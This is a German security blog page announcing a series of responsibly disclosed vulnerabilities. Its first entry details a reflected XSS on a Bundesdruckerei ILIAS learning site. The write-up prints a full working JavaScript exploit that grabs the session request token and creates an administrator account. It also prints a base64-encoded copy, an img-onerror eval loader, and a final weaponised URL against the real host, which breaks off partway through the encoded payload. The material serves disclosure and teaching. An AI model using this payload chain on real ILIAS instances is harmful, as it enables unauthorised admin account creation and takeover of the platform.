<!DOCTYPE html><html lang="en"><!--
	This website is powered by Neos, the Open Source Content Application Platform licensed under the GNU/GPL.
	Neos is based on Flow, a powerful PHP application framework licensed under the MIT license.

	More information and contribution opportunities at https://www.neos.io
-->
<head><meta charset="UTF-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<meta name="theme-color" content="#202040">
		<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
		<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
		<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
		<link rel="manifest" href="/site.webmanifest">
		<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#202040">
		<meta name="msapplication-TileColor" content="#ffffff">
		<meta name="theme-color" content="#ffffff">
		<link rel="stylesheet" media="all" href="https://mkesenheimer.github.io/mkesenheimer.github.io/_Resources/Static/Packages/matthias.kesenheimer/Styles/prism.css" />
		<link rel="stylesheet" media="all" href="https://mkesenheimer.github.io/mkesenheimer.github.io/_Resources/Static/Packages/matthias.kesenheimer/Styles/Main.min.css" />
		
			<script type="application/ld+json">
				{
					"@context": "https://schema.org",
					"@type": "BlogPosting",
					"headline": "#1SecFailEverySecondDay",
					"image": [
						"_Resources/Static/Packages/matthias.kesenheimer/Images/easter_egg.png"
					],
					"author" :{
						"@type": "Person",
						"name":"Matthias Kesenheimer",
						"email":"contact@renerehme.de"
					},
					"datePublished": "2024-01-08T13:56:07+01:00",
					"dateModified": "2024-01-08T13:56:12+01:00",
					"publisher" : {
						"@type": "Organization",
						"name":"Matthias Kesenheimer",
						"url":"https:\/\/renerehme.de",
						"logo":{
							"@type":"ImageObject",
							"url":"_Resources/Static/Packages/matthias.kesenheimer/Images/easter_egg.png"
						}
					}
				}
			</script>
		
	
		<script src="_Resources/Static/Packages/matthias.kesenheimer/JavaScript/jQuery.js"></script>
        <script src="_Resources/Static/Packages/matthias.kesenheimer/JavaScript/Plugins/anime.min.js" defer></script>
        <script src="_Resources/Static/Packages/matthias.kesenheimer/JavaScript/Plugins/prism.js" defer></script>
        <script src="_Resources/Static/Packages/matthias.kesenheimer/JavaScript/Plugins/chart.js" defer></script>
        <script src="_Resources/Static/Packages/matthias.kesenheimer/JavaScript/Main.js" defer></script>
    <title>#1SecFailEverySecondDay - Blog - Matthias Kesenheimer</title><meta name="description" content="Ich veröffentliche unter dem Hashtag #1SecFailEverySecondDay bis zum Jahr 2025 jeden zweiten Tag eine Sicherheitslücke, die ich gemeldet habe." /><meta name="robots" content="index,follow" /><link rel="canonical" href="https://mkesenheimer.github.io/mkesenheimer.github.io/index.html/blog/1-sec-fail-every-second-day" />
<link rel="alternate" hreflang="x-default" href="https://mkesenheimer.github.io/mkesenheimer.github.io/index.html/blog/1-sec-fail-every-second-day" /><link rel="alternate" hreflang="de" href="https://mkesenheimer.github.io/mkesenheimer.github.io/index.html/blog/1-sec-fail-every-second-day" />
<meta name="twitter:card" content="summary_large_image" /><meta name="twitter:creator" content="@ReneReh1" /><meta name="twitter:title" content="#1SecFailEverySecondDay" /><meta name="twitter:description" content="Ich veröffentliche unter dem Hashtag #1SecFailEverySecondDay bis zum Jahr 2025 jeden zweiten Tag eine Sicherheitslücke, die ich gemeldet habe." /><meta name="twitter:image" content="_Resources/Persistent/9bc3b5871b47050a6f099b8cfb602da5ae305cfb/card-2000x1410.jpg" /><meta name="twitter:url" content="https://mkesenheimer.github.io/mkesenheimer.github.io/index.html/blog/1-sec-fail-every-second-day" /><meta property="og:type" content="article" /><meta property="og:title" content="#1SecFailEverySecondDay" /><meta property="og:description" content="Ich veröffentliche unter dem Hashtag #1SecFailEverySecondDay bis zum Jahr 2025 jeden zweiten Tag eine Sicherheitslücke, die ich gemeldet habe." /><meta property="og:image" content="_Resources/Persistent/9041cc5a48f8f49996284fd5cc455bf420ab3d13/card-2560x1805.jpg" /><meta property="og:image:width" content="3163" /><meta property="og:image:height" content="2230" /><meta property="og:image:alt" content="card.jpg" /><meta property="og:url" content="https://mkesenheimer.github.io/mkesenheimer.github.io/index.html/blog/1-sec-fail-every-second-day" /></head><body class>
	<div id="wrapper">
		<div id="header">
			<div class="stripes">
				<span class="stripe el1"></span>
				<span class="stripe el2"></span>
				<span class="stripe el3"></span>
			</div>
            <div class="logo">
				<img height="119" width="119" class="left" alt="logo left" src="_Resources/Static/Packages/matthias.kesenheimer/Images/Brand/r-left.svg">
				<img height="119" width="119" class="right" alt="logo right" src="_Resources/Static/Packages/matthias.kesenheimer/Images/Brand/r-right.svg">
            </div>
            <div class="menu">
                <nav class="kesenheimer-matthias-menu"><ul>


<li class="">
    <a href="/about-me">Über mich</a>
</li>


<li class="current">
    <a href="/">Blog</a>
</li>


<li class="">
    <a href="/contact">Kontakt</a>
</li></ul></nav>
            </div>
		</div>

		<section id="content">
			<div class="neos-contentcollection">

<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-container">
    <div class="inner container-fluid   ">
        <div class="neos-contentcollection">

<div class="paddingTop0 paddingBottom0 kesenheimer-matthias-headline">
	<div><h1 style="text-align:center">#1SecFailEverySecondDay</h1>
</div>
</div>
<div class="paddingTop0 paddingBottom0 kesenheimer-matthias-text">
	<div><p style="text-align:center">Jeden zweiten Tag eine IT-Sicherheitslücke</p>
</div>
</div></div>
    </div>
</div>

<div class="color-white paddingTop0 paddingBottom0 kesenheimer-matthias-container">
    <div class="inner container-fluid   ">
        <div class="neos-contentcollection">

<div class="paddingTop30 paddingBottom15 kesenheimer-matthias-headline">
	<div><h2>#1SecFailEverySecondDay</h2>
</div>
</div><div class="neos-nodetypes-html">
	<script>$(function(){function initSparkling(){let t=function(){$(".sparkling-test").each(function(){let t=$(this),a=t.find(".star");a.length>5&&a.each(function(t){0===t&&$(this).remove()}),t.append(n())});let a=Math.round(700*Math.random())+100;setTimeout(t,a)},n=function(){let t=Math.floor(20*Math.random())+10;return'<span class="star" style="top:'+(Math.floor(100*Math.random())-50)+"%; left:"+Math.floor(100*Math.random())+'%;"><svg width="'+t+'" height="'+t+'" viewBox="0 0 68 68" fill="none"><path d="M26.5 25.5C19.0043 33.3697 0 34 0 34C0 34 19.1013 35.3684 26.5 43.5C33.234 50.901 34 68 34 68C34 68 36.9884 50.7065 44.5 43.5C51.6431 36.647 68 34 68 34C68 34 51.6947 32.0939 44.5 25.5C36.5605 18.2235 34 0 34 0C34 0 33.6591 17.9837 26.5 25.5Z" fill="#8475F0" /></svg></span>'};t()}$(function(){initSparkling()});});</script>
<style>@-webkit-keyframes comeInOut{0%{transform:scale(0)}50%{transform:scale(1)}100%{transform:scale(0)}}@-moz-keyframes comeInOut{0%{transform:scale(0)}50%{transform:scale(1)}100%{transform:scale(0)}}@-o-keyframes comeInOut{0%{transform:scale(0)}50%{transform:scale(1)}100%{transform:scale(0)}}@keyframes comeInOut{0%{transform:scale(0)}50%{transform:scale(1)}100%{transform:scale(0)}}@-webkit-keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(180deg)}}@-moz-keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(180deg)}}@-o-keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(180deg)}}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(180deg)}}.sparkling-test{position:relative;display:inline-block;z-index:0;font-weight:700;color:#8475F0}.sparkling-test>span{z-index:-1;position:absolute;display:block;animation:comeInOut 700ms forwards}.sparkling-test>span>svg{display:block;animation:spin 1000ms linear}</style>
<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text"><div><p>Ich habe mir was nettes für das Jahr 2024 ausgedacht. Ich veröffentliche unter dem Hashtag <span class="sparkling-test">#1SecFailEverySecondDay</span> bis zum Jahr 2025 jeden zweiten Tag eine Sicherheitslücke / Schwachstelle, die ich in meiner Freizeit bei Organisationen gemeldet habe.</p><p>Natürlich ist nicht immer etwas spektakuläres dabei (sonst bekomme ich die Tage nicht voll). In erster Linie möchte ich damit aufzeigen, dass IT-Security kein Zustand ist und regelmäßige Pentests wichtig sind.</p></div></div>
</div>


<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-headline">
	<div><h2>Mein Ansatz zur verantwortungsbewussten Offenlegung von Sicherheitslücken</h2>
</div>
</div>
<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-text">
	<div><p>In der Welt der Informationstechnologie ist die Identifizierung von Schwachstellen und Sicherheitslücken von entscheidender Bedeutung, um die Integrität digitaler Systeme zu gewährleisten.</p>

<p>Daher möchte ich betonen, dass ich jede entdeckte Schwachstelle oder Sicherheitslücke verantwortungsbewusst an die jeweiligen Organisationen gemeldet habe.</p>

<p>Meine Herangehensweise an die Offenlegung von Schwachstellen folgt dem Prinzip der Responsible Disclosure. Das bedeutet, dass ich jegliche identifizierten Sicherheitsprobleme diskret und vertraulich an die betroffenen Organisationen weitergebe. Dies ermöglicht es der Organisation, die notwendigen Maßnahmen zu ergreifen, um die Sicherheitslücken zu schließen, bevor diese von bösartigen Akteuren ausgenutzt werden können.</p>

<p>Natürlich gibt es auch Fälle, bei denen die Betroffenen, selbst nach mehrmaliger Meldung überhaupt nicht reagieren oder Sicherheitslücken auch einfach nicht schließen. Solche Fälle könnten hier ggf. auch veröffentlicht werden. Das ist allerdings die Ausnahme und auch nur dann, wenn nicht aktiv personen bezogene Daten im Spiel sind.</p>
</div>
</div><div class="neos-nodetypes-html">
	<div class="kesenheimer-matthias-warning paddingBottom30">
  <div style="border: 1px solid #b93737; background: #ffdfdf; padding: 17px; border-radius: 3px; color: #773939; border-left-width: 10px;">
Sofern Daten abgeflossen sind, wurden diese nach der jeweiligen Ausforschung sicher vernichtet. Ich behalte mir Screenshots mit ggf. personenbezogenen Daten in zensierter oder unkenntlicher Fassung für dieses Writeup vor.
  </div>
</div>
</div>
</div>
    </div>
</div>

<div class="color-white paddingTop30 paddingBottom0 kesenheimer-matthias-container">
    <div class="inner container-fluid   ">
        <div class="neos-contentcollection"><div class="neos-nodetypes-html">
	<div id="tag1"></div>
</div>


<div class="paddingTop30 paddingBottom15 kesenheimer-matthias-headline">
	<div><h1>Tag 1: Bundesdruckerei</h1>
</div>
</div>
<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text">
	<div><p><strong>Organisation</strong>: <a target="_blank" rel="noopener" href="https://www.bundesdruckerei.de/de">Die Bundesdruckerei-Gruppe</a><br />
<strong>Betroffene Systeme: </strong>learning-lab.bundesdruckerei.de<br />
<strong>Schwachstellenmeldung</strong>: 12. Dezember 2023 (fixed)</p>
</div>
</div>

<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-headline">
	<div><h2>Beschreibung</h2>
</div>
</div>
<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text">
	<div><p>Es handelte sich um eine reflektierte XSS Schwachstelle mit dem Impact, einen Administrativen Account zu ergattern. Eine OS Command Injection war (sehr wahrscheinlich) ebenfalls durchführbar. Eine User-Interaktion (das Anklicken eines Links) durch einen eingeloggten Administrator, war für die erfolgreiche Ausnutzung notwendig. Diese XSS Schwachstelle konnte in der Theorie kritisch eskaliert werden:<br />
<br />
Als Beispiel, könnte ein Angreifer durch Schadcode einen Account mit administrator Rechten erstellen. Hierzu würde es ausreichen einen modifizierten Link durch einen eingeloggten Administrator aufrufen zu lassen. Eine User-Interaktion eines priviligierten Nutzers ist für eine erfolgreiche Ausführung also notwendig.<br />
<br />
Folgende Schritte für eine erfolgreiche Ausführung dieses Scenarios sind hierfür erforderlich:</p>

<p>1. Ein Angreifer benötigt den Request Token basierend auf dem eingeloggten Nutzer und der aktiven session (in ILIAS unter rtoken bekannt).</p>

<p>2. Ein HTTP POST-Request mit einem gültigen Request Token muss an einen Administrativen Endpunkt gesendet werden. Im POST Body werden Details wie Username und Passwort durch den Angreifer für den neu anzulegenden Account angegeben.</p>

<p>Die Logik hierfür könnte wie folgt aussehen:</p>
</div>
</div>
<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-code">
	<pre class="line-numbers">
		<code class="language-php">
			<div>function sendRequest(e,n,d){return new Promise(function(a){var r=new
XMLHttpRequest;r.open(n,e,!0),r.responseType="text","POST"==n&&r.setRequestH
eader("Content-Type","multipart/form-data; boundary=----
ABCDE"),r.onreadystatechange=function()
{4!==r.readyState||200!==r.status&&302!==r.status||a(r)},r.send(d)})}var
baseUri=window.location.protocol+"//"+window.location.host,boundary="----
ABCDE",dd="--"+boundary+"\r\nContent-Disposition: form-
data;",j="\r\n\r\n",data=dd+' name="auth_mode"'+j+"local\r\n"+dd+'
name="login"'+j+"renereh\r\n"+dd+' name="passwd"'+j+"Idsmwloo80!\r\n"+dd+'
name="passwd_retype"'+j+"Idsmwloo80!\r\n"+dd+' name="active"'+j+"1\r\n"+dd+'
name="time_limit_unlimited"'+j+"1\r\n"+dd+'
name="time_limit_from"'+j+"\r\n"+dd+' name="time_limit_until"'+j+"\r\n"+dd+'
name="gender"'+j+"f\r\n"+dd+' name="firstname"'+j+"Max\r\n"+dd+'
name="lastname"'+j+"Muster\r\n"+dd+' name="title"'+j+"\r\n"+dd+'
name="userfile"; filename=""\r\nContent-Type: application/octet-
stream\r\n\r\n\r\n'+dd+' name="birthday"'+j+"\r\n"+dd+'
name="institution"'+j+"\r\n"+dd+' name="department"'+j+"\r\n"+dd+'
name="street"'+j+"\r\n"+dd+' name="city"'+j+"\r\n"+dd+'
name="zipcode"'+j+"\r\n"+dd+' name="country"'+j+"\r\n"+dd+'
name="sel_country"'+j+"\r\n"+dd+' name="phone_office"'+j+"\r\n"+dd+'
name="phone_home"'+j+"\r\n"+dd+' name="phone_mobile"'+j+"\r\n"+dd+'
name="fax"'+j+"\r\n"+dd+' name="email"'+j+"contact@renerehme.de\r\n"+dd+'
name="second_email"'+j+"\r\n"+dd+' name="hobby"'+j+"\r\n"+dd+'
name="myCounter"'+j+"\r\n"+dd+' name="referral_comment"'+j+"\r\n"+dd+'
name="myCounter"'+j+"\r\n"+dd+' name="interests_general[]"'+j+"\r\n"+dd+'
name="interests_help_offered[]"'+j+"\r\n"+dd+'
name="interests_help_looking[]"'+j+"\r\n"+dd+'
name="matriculation"'+j+"\r\n"+dd+' name="client_ip"'+j+"\r\n"+dd+'
name="default_role"'+j+"2\r\n"+dd+' name="language"'+j+"de\r\n"+dd+'
name="skin_style"'+j+"default:delos\r\n"+dd+'
name="hits_per_page"'+j+"50\r\n"+dd+'
name="hide_own_online_status"'+j+"\r\n"+dd+'
name="ilfilehash"'+j+"df06da0df2d5b329ef1a83028cb34e87\r\n"+dd+'
name="cmd[save]"'+j+"Speichern\r\n--"+boundary+"--
";sendRequest(baseUri+"/ilias.php?
cmd=show&cmdClass=ildashboardgui&baseClass=ilDashboardGUI","GET","").then(fu
nction(e){var n=(new
DOMParser).parseFromString(e.responseText,"text/html").getElementById("mm_se
arch_form").getAttribute("action").match(/rtoken=([^&]+)/),d=n?
n[1]:null;null!=d?(console.log("[+] Got a token:
"+d),sendRequest(baseUri+"/ilias.php?
ref_id=7&admin_mode=settings&cmd=post&cmdClass=ilobjusergui&cmdNode=1d:r9&ba
seClass=ilAdministrationGUI&rtoken="+d,"POST",data).then(function(e)
{console.log("[+] Admin User created.")})):alert("Fehler. Sie sind nicht als
Admin eingeloggt!")});</div>
		</code>
	</pre>
</div>
<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text">
	<div><p>Diesen Code habe ich in einer lokalen ILIAS Instanz erfolgreich ausführen können. Dabei wird ein</p>

<p>Nutzer "<strong>renereh</strong> " mit dem Passwort "<strong>Idsmwloo80!</strong>" und Adminrechten erstellt. Damit dieser Code über die gefundene XSS Schwachstelle ausgeführt werden kann, muss dieser so enkodiert werden, damit die korrekte Interpretation durch die Übergabe des Schadcodes in einer URL final durch den Browser stattfinden kann. Alternativ könnte der Schadcode auch durch ein externes JS File geladen werden, was aber durch diverse Policies i.d.R geblockt wird (fremder Origin).</p>

<p>Via Base64 wird der Schadcode also wie folgt enkodiert:</p>
</div>
</div>
<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-code">
	<pre class="line-numbers">
		<code class="language-php">
			<div>ZnVuY3Rpb24gc2VuZFJlcXVlc3QoZSxuLGQpe3JldHVybiBuZXcgUHJvbWlzZShmdW5jdGlvbihh
KXt2YXIgcj1uZXcgWE1MSHR0cFJlcXVlc3Q7ci5vcGVuKG4sZSwhMCksci5yZXNwb25zZVR5cGU9
InRleHQiLCJQT1NUIj09biYmci5zZXRSZXF1ZXN0SGVhZGVyKCJDb250ZW50LVR5cGUiLCJtdWx0
aXBhcnQvZm9ybS1kYXRhOyBib3VuZGFyeT0tLS0tQUJDREUiKSxyLm9ucmVhZHlzdGF0ZWNoYW5n
ZT1mdW5jdGlvbigpezQhPT1yLnJlYWR5U3RhdGV8fDIwMCE9PXIuc3RhdHVzJiYzMDIhPT1yLnN0
YXR1c3x8YShyKX0sci5zZW5kKGQpfSl9dmFyIGJhc2VVcmk9d2luZG93LmxvY2F0aW9uLnByb3Rv
Y29sKyIvLyIrd2luZG93LmxvY2F0aW9uLmhvc3QsYm91bmRhcnk9Ii0tLS1BQkNERSIsZGQ9Ii0t
Iitib3VuZGFyeSsiXHJcbkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsiLGo9IlxyXG5c
clxuIixkYXRhPWRkKycgbmFtZT0iYXV0aF9tb2RlIicraisibG9jYWxcclxuIitkZCsnIG5hbWU9
ImxvZ2luIicraisicmVuZXJlaFxyXG4iK2RkKycgbmFtZT0icGFzc3dkIicraisiSWRzbXdsb284
MCFcclxuIitkZCsnIG5hbWU9InBhc3N3ZF9yZXR5cGUiJytqKyJJZHNtd2xvbzgwIVxyXG4iK2Rk
KycgbmFtZT0iYWN0aXZlIicraisiMVxyXG4iK2RkKycgbmFtZT0idGltZV9saW1pdF91bmxpbWl0
ZWQiJytqKyIxXHJcbiIrZGQrJyBuYW1lPSJ0aW1lX2xpbWl0X2Zyb20iJytqKyJcclxuIitkZCsn
IG5hbWU9InRpbWVfbGltaXRfdW50aWwiJytqKyJcclxuIitkZCsnIG5hbWU9ImdlbmRlciInK2or
ImZcclxuIitkZCsnIG5hbWU9ImZpcnN0bmFtZSInK2orIk1heFxyXG4iK2RkKycgbmFtZT0ibGFz
dG5hbWUiJytqKyJNdXN0ZXJcclxuIitkZCsnIG5hbWU9InRpdGxlIicraisiXHJcbiIrZGQrJyBu
YW1lPSJ1c2VyZmlsZSI7IGZpbGVuYW1lPSIiXHJcbkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24v
b2N0ZXQtc3RyZWFtXHJcblxyXG5cclxuJytkZCsnIG5hbWU9ImJpcnRoZGF5IicraisiXHJcbiIr
ZGQrJyBuYW1lPSJpbnN0aXR1dGlvbiInK2orIlxyXG4iK2RkKycgbmFtZT0iZGVwYXJ0bWVudCIn
K2orIlxyXG4iK2RkKycgbmFtZT0ic3RyZWV0IicraisiXHJcbiIrZGQrJyBuYW1lPSJjaXR5Iicr
aisiXHJcbiIrZGQrJyBuYW1lPSJ6aXBjb2RlIicraisiXHJcbiIrZGQrJyBuYW1lPSJjb3VudHJ5
IicraisiXHJcbiIrZGQrJyBuYW1lPSJzZWxfY291bnRyeSInK2orIlxyXG4iK2RkKycgbmFtZT0i
cGhvbmVfb2ZmaWNlIicraisiXHJcbiIrZGQrJyBuYW1lPSJwaG9uZV9ob21lIicraisiXHJcbiIr
ZGQrJyBuYW1lPSJwaG9uZV9tb2JpbGUiJytqKyJcclxuIitkZCsnIG5hbWU9ImZheCInK2orIlxy
XG4iK2RkKycgbmFtZT0iZW1haWwiJytqKyJjb250YWN0QHJlbmVyZWhtZS5kZVxyXG4iK2RkKycg
bmFtZT0ic2Vjb25kX2VtYWlsIicraisiXHJcbiIrZGQrJyBuYW1lPSJob2JieSInK2orIlxyXG4i
K2RkKycgbmFtZT0ibXlDb3VudGVyIicraisiXHJcbiIrZGQrJyBuYW1lPSJyZWZlcnJhbF9jb21t
ZW50IicraisiXHJcbiIrZGQrJyBuYW1lPSJteUNvdW50ZXIiJytqKyJcclxuIitkZCsnIG5hbWU9
ImludGVyZXN0c19nZW5lcmFsW10iJytqKyJcclxuIitkZCsnIG5hbWU9ImludGVyZXN0c19oZWxw
X29mZmVyZWRbXSInK2orIlxyXG4iK2RkKycgbmFtZT0iaW50ZXJlc3RzX2hlbHBfbG9va2luZ1td
IicraisiXHJcbiIrZGQrJyBuYW1lPSJtYXRyaWN1bGF0aW9uIicraisiXHJcbiIrZGQrJyBuYW1l
PSJjbGllbnRfaXAiJytqKyJcclxuIitkZCsnIG5hbWU9ImRlZmF1bHRfcm9sZSInK2orIjJcclxu
IitkZCsnIG5hbWU9Imxhbmd1YWdlIicraisiZGVcclxuIitkZCsnIG5hbWU9InNraW5fc3R5bGUi
JytqKyJkZWZhdWx0OmRlbG9zXHJcbiIrZGQrJyBuYW1lPSJoaXRzX3Blcl9wYWdlIicraisiNTBc
clxuIitkZCsnIG5hbWU9ImhpZGVfb3duX29ubGluZV9zdGF0dXMiJytqKyJcclxuIitkZCsnIG5h
bWU9ImlsZmlsZWhhc2giJytqKyJkZjA2ZGEwZGYyZDViMzI5ZWYxYTgzMDI4Y2IzNGU4N1xyXG4i
K2RkKycgbmFtZT0iY21kW3NhdmVdIicraisiU3BlaWNoZXJuXHJcbi0tIitib3VuZGFyeSsiLS0i
O3NlbmRSZXF1ZXN0KGJhc2VVcmkrIi9pbGlhcy5waHA/Y21kPXNob3cmY21kQ2xhc3M9aWxkYXNo
Ym9hcmRndWkmYmFzZUNsYXNzPWlsRGFzaGJvYXJkR1VJIiwiR0VUIiwiIikudGhlbihmdW5jdGlv
bihlKXt2YXIgbj0obmV3IERPTVBhcnNlcikucGFyc2VGcm9tU3RyaW5nKGUucmVzcG9uc2VUZXh0
LCJ0ZXh0L2h0bWwiKS5nZXRFbGVtZW50QnlJZCgibW1fc2VhcmNoX2Zvcm0iKS5nZXRBdHRyaWJ1
dGUoImFjdGlvbiIpLm1hdGNoKC9ydG9rZW49KFteJl0rKS8pLGQ9bj9uWzFdOm51bGw7bnVsbCE9
ZD8oY29uc29sZS5sb2coIlsrXSBHb3QgYSB0b2tlbjogIitkKSxzZW5kUmVxdWVzdChiYXNlVXJp
KyIvaWxpYXMucGhwP3JlZl9pZD03JmFkbWluX21vZGU9c2V0dGluZ3MmY21kPXBvc3QmY21kQ2xh
c3M9aWxvYmp1c2VyZ3VpJmNtZE5vZGU9MWQ6cjkmYmFzZUNsYXNzPWlsQWRtaW5pc3RyYXRpb25H
VUkmcnRva2VuPSIrZCwiUE9TVCIsZGF0YSkudGhlbihmdW5jdGlvbihlKXtjb25zb2xlLmxvZygi
WytdIEFkbWluIFVzZXIgY3JlYXRlZC4iKX0pKTphbGVydCgiRmVobGVyLiBTaWUgc2luZCBuaWNo
dCBhbHMgQWRtaW4gZWluZ2Vsb2dndCEiKX0pOw==
</div>
		</code>
	</pre>
</div>
<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-text">
	<div><p>Normalerweiße könnte dieser String nun via</p>
</div>
</div>
<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-code">
	<pre class="line-numbers">
		<code class="language-php">
			<div>https://learning-lab.bundesdruckerei.de/api/&lt;img src=x onerror=eval(atob('<--base64-string-->'))></div>
		</code>
	</pre>
</div>
<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-text">
	<div><p>in der URL verwendet werden.</p>

<p>Problematisch ist, dass im Base64-String das Slash-Zeichen " <strong>/</strong> " vorkommt, was die Logik bei direkter Übermittlung in der URL an dieser Stelle durch die Interpretation eines weiteren Pfadsegmentes unterprechen würde.</p>

<p>Durch einen kleinen Workaround ist es dennoch möglich. Splittet man den Base64-String in zwei Teile, gibt diese über zwei separate URL Query-Parameter an und fügt sie zur Dekodierung und Interpretation wieder zusammen, kann das Zeichen " <strong>/</strong> " in der URL eliminiert werden:</p>
</div>
</div>
<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-code">
	<pre class="line-numbers">
		<code class="language-php">
			<div>/api/XXX?param1=Base64Part1&amp;param2=Base64Part2 </div>
		</code>
	</pre>
</div>
<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-text">
	<div><p>Damit das funktioniert, werden die Parts ausgelesen, zusammengesetzt und anschließend via <strong>innerHTML</strong> in den HTML <strong>&lt;body&gt;</strong> geschreiben. Dabei wird ein IMG-Tag verwendet, sobei der Schadcode in eine onerror Attribut überführt wird. Da <strong>src=x </strong>nicht geladen werden kann, wird das Event onerror aktiv, welches final die zusammengesetzte Payload decodiert ( <strong>atob</strong> ) und ausführt ( <strong>eval</strong> ):</p>
</div>
</div>
<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-code">
	<pre class="line-numbers">
		<code class="language-php">
			<div>const sp = new URLSearchParams(window.location.search);var i = &quot;&lt;img src=x onerror=eval(atob(&#39;&quot;+sp.get(&quot;param1&quot;)+&quot;/&quot;+sp.get(&quot;param2&quot;)+&quot;&#39;))&gt;&quot;;document.body.innerHTML = i;</div>
		</code>
	</pre>
</div>
<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-text">
	<div><p>Dieser Codeschnipsel wird als URL-Pfad nach <strong>/api/</strong> encodiert über ein onerror event angegeben und wird initial ausgeführt. Die finale Payload sieht wie folgt aus:</p>
</div>
</div>
<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-code">
	<pre class="line-numbers">
		<code class="language-php">
			<div>https://learning-
lab.bundesdruckerei.de/api/%3Cimg%20src=x%20onerror=eval(atob('Y29uc3Qgc3AgP
SBuZXcgVVJMU2VhcmNoUGFyYW1zKHdpbmRvdy5sb2NhdGlvbi5zZWFyY2gpO3ZhciBpID0gIjxpb
Wcgc3JjPXggb25lcnJvcj1ldmFsKGF0b2IoJyIrc3AuZ2V0KCJiMSIpKyIvIitzcC5nZXQoImIyI
ikrIicpKT4iO2RvY3VtZW50LmJvZHkuaW5uZXJIVE1MID0gaTs='))%3E?
b1=ZnVuY3Rpb24gc2VuZFJlcXVlc3QoZSxuLGQpe3JldHVybiBuZXcgUHJvbWlzZShmdW5jdGlvb
ihhKXt2YXIgcj1uZXcgWE1MSHR0cFJlcXVlc3Q7ci5vcGVuKG4sZSwhMCksci5yZXNwb25zZVR5c
GU9InRleHQiLCJQT1NUIj09biYmci5zZXRSZXF1ZXN0SGVhZGVyKCJDb250ZW50LVR5cGUiLCJtd
Wx0aXBhcnQvZm9ybS1kYXRhOyBib3VuZGFyeT0tLS0tQUJDREUiKSxyLm9ucmVhZHlzdGF0ZWNoY
W5nZT1mdW5jdGlvbigpezQhPT1yLnJlYWR5U3RhdGV8fDIwMCE9PXIuc3RhdHVzJiYzMDIhPT1yL
nN0YXR1c3x8YShyKX0sci5zZW5kKGQpfSl9dmFyIGJhc2VVcmk9d2luZG93LmxvY2F0aW9uLnByb
3RvY29sKyIvLyIrd2luZG93LmxvY2F0aW9uLmhvc3QsYm91bmRhcnk9Ii0tLS1BQkNERSIsZGQ9I
i0tIitib3VuZGFyeSsiXHJcbkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsiLGo9IlxyX
G5cclxuIixkYXRhPWRkKycgbmFtZT0iYXV0aF9tb2RlIicraisibG9jYWxcclxuIitkZCsnIG5hb
WU9ImxvZ2luIicraisicmVuZXJlaFxyXG4iK2RkKycgbmFtZT0icGFzc3dkIicraisiSWRzbXdsb
284MCFcclxuIitkZCsnIG5hbWU9InBhc3N3ZF9yZXR5cGUiJytqKyJJZHNtd2xvbzgwIVxyXG4iK
2RkKycgbmFtZT0iYWN0aXZlIicraisiMVxyXG4iK2RkKycgbmFtZT0idGltZV9saW1pdF91bmxpb
Wl0ZWQiJytqKyIxXHJcbiIrZGQrJyBuYW1lPSJ0aW1lX2xpbWl0X2Zyb20iJytqKyJcclxuIitkZ
CsnIG5hbWU9InRpbWVfbGltaXRfdW50aWwiJytqKyJcclxuIitkZCsnIG5hbWU9ImdlbmRlciInK
2orImZcclxuIitkZCsnIG5hbWU9ImZpcnN0bmFtZSInK2orIk1heFxyXG4iK2RkKycgbmFtZT0ib
GFzdG5hbWUiJytqKyJNdXN0ZXJcclxuIitkZCsnIG5hbWU9InRpdGxlIicraisiXHJcbiIrZGQrJ
yBuYW1lPSJ1c2VyZmlsZSI7IGZpbGVuYW1lPSIiXHJcbkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb
24vb2N0ZXQtc3RyZWFtXHJcblxyXG5cclxuJytkZCsnIG5hbWU9ImJpcnRoZGF5IicraisiXHJcb
iIrZGQrJyBuYW1lPSJpbnN0aXR1dGlvbiInK2orIlxyXG4iK2RkKycgbmFtZT0iZGVwYXJ0bWVud
CInK2orIlxyXG4iK2RkKycgbmFtZT0ic3RyZWV0IicraisiXHJcbiIrZGQrJyBuYW1lPSJjaXR5I
icraisiXHJcbiIrZGQrJyBuYW1lPSJ6aXBjb2RlIicraisiXHJcbiIrZGQrJyBuYW1lPSJjb3Vud
HJ5IicraisiXHJcbiIrZGQrJyBuYW1lPSJzZWxfY291bnRyeSInK2orIlxyXG4iK2RkKycgbmFtZ
T0icGhvbmVfb2ZmaWNlIicraisiXHJcbiIrZGQrJyBuYW1lPSJwaG9uZV9ob21lIicraisiXHJcb
iIrZGQrJyBuYW1lPSJwaG9uZV9tb2JpbGUiJytqKyJcclxuIitkZCsnIG5hbWU9ImZheCInK2orI
lxyXG4iK2RkKycgbmFtZT0iZW1haWwiJytqKyJjb250YWN0QHJlbmVyZWhtZS5kZVxyXG4iK2RkK
ycgbmFtZT0ic2Vjb25kX2VtYWlsIicraisiXHJcbiIrZGQrJyBuYW1lPSJob2JieSInK2orIlxyX
